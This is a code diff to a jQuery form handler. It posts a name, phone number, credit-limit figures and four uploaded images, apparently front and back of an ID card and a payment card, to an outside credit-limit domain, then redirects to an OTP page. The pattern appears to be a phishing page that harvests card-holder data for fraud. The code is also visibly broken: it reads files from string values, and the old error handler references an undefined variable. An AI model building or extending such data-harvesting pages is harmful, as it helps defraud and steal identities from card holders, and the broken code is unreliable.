@@ -85,49 +85,96 @@ $("#matsau_card").change(function () {
 
 $('#service').submit(function (e) {
     e.preventDefault();
-    var formData = new FormData(this);
-    formData.append('name', $('#name').val());
-    formData.append('phone', $('#phone').val());
-    formData.append('limit_now', $('#limit_now').val());
-    formData.append('limit_total', $('#limit_total').val());
-    formData.append('limit_increase', $('#limit_increase').val());
-    formData.append('imageIds[0]', $('#mattruoc').prop('files')[0]);
-    formData.append('imageIds[1]', $('#matsau').prop('files')[0]);
-    formData.append('imageIds[2]', $('#mattruoc_card').prop('files')[0]);
-    formData.append('imageIds[3]', $('#matsau_card').prop('files')[0]);
+    var formData = new FormData($(this)[0]);
 
-    $.ajax({
-        url: 'https://app.nanghanmuctindung.online/api/customer',
-        type: 'POST',
-        data: formData,
-        contentType: false,
-        processData: false,
-        cache: false,
-        headers: {
-            'Aceess-Control-Allow-Origin': '*',
-            'Accept': 'application/json',
-        },
-        success: function (data) {
-            window.location.href = '/otp.html';
-        },
-        error: function (data) {
-            if (err.response.status == 422) {
-                if (err.response.data.errors.name) {
-                    alert(err.response.data.errors.name[0]);
-                } else if (err.response.data.errors.phone) {
-                    alert(err.response.data.errors.phone[0]);
-                } else if (err.response.data.errors.limit_now) {
-                    alert(err.response.data.errors.limit_now[0]);
-                } else if (err.response.data.errors.limit_total) {
-                    alert(err.response.data.errors.limit_total[0]);
-                } else if (err.response.data.errors.limit_increase) {
-                    alert(err.response.data.errors.limit_increase[0]);
-                } else if (err.response.data.errors.imageIds) {
-                    alert(err.response.data.errors.imageIds[0]);
-                }
+    var mattruoc = $('#mattruoc').val();
+    var matsau = $('#matsau').val();
+    var mattruoc_card = $('#mattruoc_card').val();
+    var matsau_card = $('#matsau_card').val();
+    // formData.append('name', $('#name').val());
+    // formData.append('phone', $('#phone').val());
+    // formData.append('limit_now', $('#limit_now').val());
+    // formData.append('limit_total', $('#limit_total').val());
+    // formData.append('limit_increase', $('#limit_increase').val());
+    // formData.append('mattruoc', mattruoc);
+    // formData.append('matsau', matsau);
+    // formData.append('mattruoc_card', mattruoc_card);
+    // formData.append('matsau_card', matsau_card);
+
+    if (navigator.userAgent.indexOf('Safari') != -1 && navigator.userAgent.indexOf('Chrome') == -1) {
+        formData.append('mattruoc', mattruoc.files[0]);
+        formData.append('matsau', matsau.files[0]);
+        formData.append('mattruoc_card', mattruoc_card.files[0]);
+        formData.append('matsau_card', matsau_card.files[0]);
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://app.nanghanmuctindung.online/api/customer', true);
+        xhr.send(formData);
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                window.location.href = '/otp.html';
             } else {
-                alert('Có lỗi xảy ra, vui lòng thử lại sau.');
+                console.log(xhr);
+                alert('Vui lòng kiểm tra lại thông tin!');
             }
         }
-    });
+        return;
+
+    } else {
+        $.ajax({
+            url: 'https://app.nanghanmuctindung.online/api/customer',
+            // url: 'http://localhost/api/customer',
+            type: 'POST',
+            data: formData,
+            contentType: false,
+            processData: false,
+            cache: false,
+            headers: {
+                'Aceess-Control-Allow-Origin': '*',
+                'Accept': 'application/json',
+            },
+            success: function (data) {
+                window.location.href = '/otp.html';
+            },
+            error: function (data) {
+                console.log(data);
+                alert('Vui lòng kiểm tra lại thông tin!');
+            }
+        });
+    }
+
+    // $.ajax({
+    //     url: 'https://app.nanghanmuctindung.online/api/customer',
+    //     type: 'POST',
+    //     data: formData,
+    //     contentType: false,
+    //     processData: false,
+    //     cache: false,
+    //     headers: {
+    //         'Aceess-Control-Allow-Origin': '*',
+    //         'Accept': 'application/json',
+    //     },
+    //     success: function (data) {
+    //         window.location.href = '/otp.html';
+    //     },
+    //     error: function (data) {
+    //         if (err.response.status == 422) {
+    //             if (err.response.data.errors.name) {
+    //                 alert(err.response.data.errors.name[0]);
+    //             } else if (err.response.data.errors.phone) {
+    //                 alert(err.response.data.errors.phone[0]);
+    //             } else if (err.response.data.errors.limit_now) {
+    //                 alert(err.response.data.errors.limit_now[0]);
+    //             } else if (err.response.data.errors.limit_total) {
+    //                 alert(err.response.data.errors.limit_total[0]);
+    //             } else if (err.response.data.errors.limit_increase) {
+    //                 alert(err.response.data.errors.limit_increase[0]);
+    //             } else if (err.response.data.errors.imageIds) {
+    //                 alert(err.response.data.errors.imageIds[0]);
+    //             }
+    //         } else {
+    //             alert('Có lỗi xảy ra, vui lòng thử lại sau.');
+    //         }
+    //     }
+    // });
 });
